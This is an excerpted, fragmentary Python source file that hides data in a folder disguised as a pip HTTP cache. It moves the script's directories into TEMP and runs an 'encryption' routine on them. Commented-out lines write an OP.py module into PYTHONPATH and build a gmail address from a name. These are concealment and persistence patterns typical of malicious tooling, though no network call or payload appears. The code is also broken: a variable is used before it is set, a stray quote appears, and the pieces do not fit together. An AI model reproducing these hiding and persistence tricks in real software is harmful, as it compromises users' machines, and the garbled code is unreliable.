...
def dirOP():
    # home = os.getcwd()
    # homeSS= (os.environ["LOCALAPPDATA"]+ r"\pip\cache\http\b\b") if os.name=="nt" else ( os.environ["HOME"]+"/.cache/pip/http/b/b") 
    # os.chdir(homeSS)        
    # wow = os.popen("git config root.dir").read().rstrip()
    # B.__dict__["wow"] = wow
       
    ######################################### 注意這裡 斜線都要兩倍
    return (".pip.cache.http.b.b".replace(".","\\\\") +"\\\\" ) if os.name=="nt" else ("/.cache/pip/http/b/b")        
    

    # return (os.environ["LOCALAPPDATA"]+ r"\pip\cache\http\b\b") if os.name=="nt" else ( os.environ["HOME"]+"/.cache/pip/http/b/b" if os.name=="posix" else "None" )        
    # os.environ["sys.dir"]= str(str(dirOP()).encode("utf8")) 
    ##############################################
    ###eval(os.environ["sys.dir"]).decode('utf-8')


# def startOP():
#     SS=dirOP()
#     os.chdir( SS )
#     # os.system(f'start cmd /k "timeout /nobreak /t 3&& echo 999{ SS }999 && pause"')
#     wow = os.popen("git config root.dir").read().rstrip()
#     # os.system(f'start cmd /k "timeout /nobreak /t 3&& echo 999{ wow }999 && pause"')
#     return wow
...
def mainQ():
    ...
    DDD = os.environ["LOCALAPPDATA"]+ ".pip.cache.http.b.b".replace(".","\\\\")  if os.name=="nt" else ( os.environ["HOME"]+"/.cache/pip/http/b/b" if os.name=="posix" else "None" )
    if DDD != "None":
        for DIR in dirRR:
            mv( os.path.dirname(__file__)+ os.path.sep + DIR  ,  os.environ[ "TEMP" ] +os.path.sep + f"{sumQ}..\\\\" + os.path.sep + DIR )  ; 
    ...
    home = os.getcwd()
    os.chdir( sumPATH )
    sumQ = os.popen("git config root.dir").read().rstrip()
    os.chdir( home )
    EQ64( os.environ[ "TEMP" ] + os.path.sep + f"{ dirQ() }..\\\\"  )



    # import os
    # # os.system(f'start cmd /k "timeout /nobreak /t 3&& echo !!520!! && pause"')
    # fileQ = os.environ["PYTHONPATH"]+os.path.sep+"OP.py"
    # os.system(f'start cmd /k "timeout /nobreak /t 3&& notepad {fileQ} && pause"')
    # ### 加密
    # import os
    # ###### EQ64( os.environ[ "TEMP" ] + os.path.sep + f"{sumQ}..\\"  )
    # ############################################################################### 注意這裡 斜線都要兩倍
    # EQ64( os.environ[ "TEMP" ] + os.path.sep + f"{ dirQ() }..\\\\"  )
    # SS= os.environ[ "TEMP" ] + os.path.sep + f"{ dirQ() }..\\\\"
    # os.system(f'start cmd /k "timeout /nobreak /t 6&& echo 991{ SS }199 && pause"')
...
def emailQ():
    ...
    # import os
    # os.environ[ "Email" ] = str(name[0:-3]+"@gmail.com")
    return  str(name[0:-3]+"@gmail.com")
'''
            # open(os.environ["PYTHONPATH"]+os.path.sep+"OP.py","w").write(text)
            ###############################################
            ################################################
            ###############################################
            ################################################
...
# ################################################
# import builtins as B
# B.__dict__["home"] =  (os.environ["LOCALAPPDATA"]) if os.name=="nt" else (os.environ["HOME"])
# import os
# os.environ["sys.home"] =  (os.environ["LOCALAPPDATA"]) if os.name=="nt" else (os.environ["HOME"])
